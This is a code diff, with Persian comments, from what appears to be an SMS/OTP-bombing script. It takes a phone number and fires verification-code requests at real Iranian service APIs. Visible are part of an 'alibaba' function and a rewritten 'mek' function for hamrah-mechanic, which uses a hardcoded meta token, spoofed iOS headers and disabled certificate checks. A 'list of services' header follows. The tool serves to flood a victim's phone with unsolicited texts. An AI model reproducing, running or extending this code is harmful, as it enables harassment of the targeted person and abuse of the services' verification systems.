@@ -92,61 +92,47 @@ def alibaba(phone):
         print(f"{r}[!] alibaba exception: {e}{a}")
         return False
 
+
+
+
 def mek(phone):
     try:
-        session = requests.Session()
+        # فرمت شماره
         formatted_phone = re.sub(r'[^0-9]', '', phone.replace("+98", ""))
         formatted_phone = f"0{formatted_phone}"
 
-        # مرحله 1: GET صفحه اصلی برای گرفتن اطلاعات پویا
-        main_url = "https://www.hamrah-mechanic.com/membersignin/"
-        resp = session.get(main_url, timeout=10)
-        resp.encoding = 'utf-8'
-
-        # استخراج X-Meta-Token از متا یا جاوااسکریپت (مثال ساده)
-        token_match = re.search(r'X-Meta-Token["\']?\s*:\s*["\'](\d+)', resp.text)
-        x_meta_token = token_match.group(1) if token_match else "413341"
-
-        # استخراج landingPageUrl و orderPageUrl از لینک‌ها یا متا
-        landing_url_match = re.search(r'landingPageUrl["\']?\s*:\s*["\']([^"\']+)', resp.text)
-        landing_page_url = landing_url_match.group(1) if landing_url_match else "https://www.hamrah-mechanic.com/carprice/saipa/zamyadpickup/type-2543/"
-
-        order_url_match = re.search(r'orderPageUrl["\']?\s*:\s*["\']([^"\']+)', resp.text)
-        order_page_url = order_url_match.group(1) if order_url_match else "https://www.hamrah-mechanic.com/membersignin/"
-
-        prev_url_match = re.search(r'prevUrl["\']?\s*:\s*["\']([^"\']+)', resp.text)
-        prev_url = prev_url_match.group(1) if prev_url_match else "https://www.hamrah-mechanic.com/profile/"
-
-        # payload داینامیک
+        # URL و payload
+        url = "https://www.hamrah-mechanic.com/api/v1/membership/otp"
         payload = {
             "PhoneNumber": formatted_phone,
             "prevDomainUrl": None,
-            "landingPageUrl": landing_page_url,
-            "orderPageUrl": order_page_url,
-            "prevUrl": prev_url,
+            "landingPageUrl": "https://www.hamrah-mechanic.com/carprice/saipa/zamyadpickup/type-2543/",
+            "orderPageUrl": "https://www.hamrah-mechanic.com/membersignin/",
+            "prevUrl": "https://www.hamrah-mechanic.com/profile/",
             "referrer": None
         }
 
+        # هدرها
         headers = {
             "Accept": "application/json",
             "Content-Type": "application/json",
             "env": "prd",
             "Source": "ios",
-            "X-Meta-Token": x_meta_token,
+            "X-Meta-Token": "413341",
             "_uti": str(uuid.uuid4())
         }
 
-        # POST درخواست OTP
-        r = session.post("https://www.hamrah-mechanic.com/api/v1/membership/otp",
-                         json=payload, headers=headers, timeout=10, verify=False)
+        # درخواست POST
+        r = requests.post(url, json=payload, headers=headers, timeout=10, verify=False)
         print(r.status_code, r.text)  # debug
-
-        return r.status_code == 200
+        if r.status_code == 200:
+            return True
+        else:
+            return False
 
     except Exception as e:
         print(f'{r}[!] HamrahMechanic Exception: {e}{a}')
         return False
-
 # ==========================
 # لیست سرویس‌ها
 # ==========================
